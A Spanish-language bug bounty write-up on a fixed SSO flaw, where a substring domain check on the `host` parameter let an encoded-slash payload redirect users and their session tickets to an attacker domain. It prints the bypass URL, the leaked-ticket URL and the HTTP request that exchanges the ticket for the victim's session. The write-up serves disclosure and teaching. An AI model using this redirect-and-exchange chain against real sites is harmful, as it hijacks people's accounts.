---
title:       "Toma de cuenta con un clic: el open redirect del SSO entregaba el ticket de sesión"
summary:     "Un parámetro `host` del SSO aceptaba dominios ajenos si les pegabas una barra en el sitio justo. Lo que se iba al dominio del atacante no era al usuario: era su ticket de sesión. Un clic y la cuenta cambia de dueño."
date:        2026-10-18 12:05:00 +0100
lang:        es
ref:         open-redirect-sso-ticket
image:       /assets/img/og/open-redirect-sso-ticket-es.png

severity:    high
cvss:        "8.1"
cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
cwe:         "CWE-601 · CWE-287"
vuln_class:  "Autenticación"
target_type: "SSO web"
platform:    "YesWeHack"
status:      "Corregido"
tags:        [open-redirect, sso, ato, sesion, cookies, bypass-de-lista-blanca]

takeaways:
  - "Un *open redirect* vale poco. Un *open redirect* que arrastra una credencial en la URL vale una cuenta."
  - "Comparar dominios como texto es el error: `atacante.com/.marca.com` **contiene** `.marca.com` y no tiene nada que ver con él."
  - "Antes de celebrar, comprueba que el parámetro está validado de verdad: si una entrada inválida se rechaza y la tuya pasa, has encontrado un bypass, no un campo abierto."
  - "El ticket debe estar atado al destino que lo pidió. Si vale en cualquier sitio, cualquier sitio puede gastarlo."
---

Un SSO acepta en la URL a dónde devolverte después del login:

```
https://sso.ejemplo.tld/doLogin?host=app.ejemplo.tld
```

Ese parámetro lo escribe quien hace el enlace, y quien hace el enlace puede ser cualquiera.
Lo primero que probé fue mi propio dominio: **rechazado**, con un error interno. Buena
noticia: hay un control, y un control se puede estudiar.

## Qué regla aplicaba

La forma más común de validar un dominio, y la más rota, es preguntar si el texto termina
en `.marca.com` o —peor— si lo contiene. Falla porque una URL no es una cadena: el
navegador decide el destino con lo que hay **antes de la primera barra**.

| Valor del parámetro | Lo que ve la comprobación | Dónde acaba el navegador |
|---|---|---|
| `app.marca.com` | contiene `.marca.com` ✅ | `app.marca.com` ✅ |
| `atacante.com/.marca.com` | contiene `.marca.com` ✅ | **`atacante.com`** ⚠ |
| `atacante.com%2F.marca.com` | tras decodificar, igual | **`atacante.com`** ⚠ |

<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/02-anatomia-url.svg' | relative_url }}"
       alt="Diagrama de una URL: el servidor de destino es lo que hay antes de la primera barra, y el resto es la ruta; la comprobación de texto mira la cadena entera">
  <figcaption>El navegador corta en la primera barra. La comprobación mira la cadena entera. Ahí está el hueco.</figcaption>
</figure>

`atacante.com/.marca.com` es una página llamada `.marca.com` dentro del servidor del
atacante. La comprobación la deja pasar porque el texto contiene lo que busca. El `%2F` es
la misma barra escrita en código de URL: el servidor la decodifica antes de comparar, y así
se cuela donde una barra literal habría sido rechazada.

```
https://sso.ejemplo.tld/doLogin?host=atacante-ejemplo.com%2F.marca-ejemplo.com
```

Aceptado.

## Lo que se iba con la redirección

Un open redirect a secas es poca cosa. Lo que convierte esto en otra cosa es que el SSO
añadía a la URL de vuelta un **ticket de sesión**: una cadena de un solo uso que la
aplicación canjea para obtener las cookies del usuario.

```
https://atacante-ejemplo.com/.marca-ejemplo.com?ticket=a1b2c3d4e5f6...
```

El atacante controla ese servidor, así que lo lee en su propio registro de accesos.

<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/01-ticket-al-atacante.png' | relative_url }}"
       alt="Arriba la peticion de login con el parametro host=atk.example.com%2F. seguido del dominio de la victima, tapado. Abajo la respuesta del servidor, cuyo campo redirectUrl apunta a atk.example.com y lleva el ticket au= en la URL">
  <figcaption>Arriba lo que envié; abajo lo que respondió el servidor. El <code>redirectUrl</code> apunta al dominio del atacante y lleva el ticket <code>au=</code> pegado. Dos recortes de la misma petición, con el host, la cuenta y el dominio de la víctima tapados.</figcaption>
</figure>

## Un clic

Si la víctima ya tiene la sesión abierta —el caso normal— no aparece ninguna pantalla de
login: el SSO ve las cookies, da por buena la identidad y emite el ticket directamente. Un
clic en un enlace cuyo dominio visible es el del fabricante, sin escribir contraseña y sin
ver nada raro.

<figure>
  <img src="{{ '/assets/img/writeups/open-redirect-sso/03-cadena.svg' | relative_url }}"
       alt="Diagrama de los cinco pasos: la víctima abre el enlace, el SSO emite el ticket sin pedir contraseña, la redirección lo lleva al dominio del atacante, este lo lee en su log y lo canjea desde una sesión limpia">
  <figcaption>Cinco pasos y una sola acción de la víctima. Lo que viaja en la redirección es una credencial.</figcaption>
</figure>

## Canjearlo

Desde una sesión limpia: otro navegador, otra máquina, sin cookie ninguna.

```http
GET /auth?ticket=a1b2c3d4e5f6... HTTP/2
Host: api.ejemplo.tld
```

```http
HTTP/2 200 OK
set-cookie: SESSION_ID=...;  USER_ID=...;  USERNAME=...
```

El ticket por sí solo produjo la sesión de la víctima. Para demostrar qué abre hice una
única lectura, el perfil del propio usuario, y devolvió sus datos personales en claro,
incluido el correo completo — mientras la interfaz lo enseña enmascarado. Ahí paré.

## Un extra

Una de las cookies que se establecían al canjear llevaba **el mismo identificador de
sesión en claro** y, a diferencia de la principal, sin `HttpOnly`. Da igual proteger la
primera: cualquier script lo lee de la otra.

## Impacto

<div class="impact" markdown="1">
**Impacto.** Toma de control total de la cuenta a partir de **un solo clic** de la víctima,
en un enlace cuyo dominio visible es el legítimo del fabricante. El atacante obtiene la
sesión completa: datos personales sin enmascarar, correo, identificador de usuario y acceso
al resto de recursos que esa sesión alcanza. No hace falta contraseña, ni segundo factor,
ni que la víctima rellene nada.
</div>
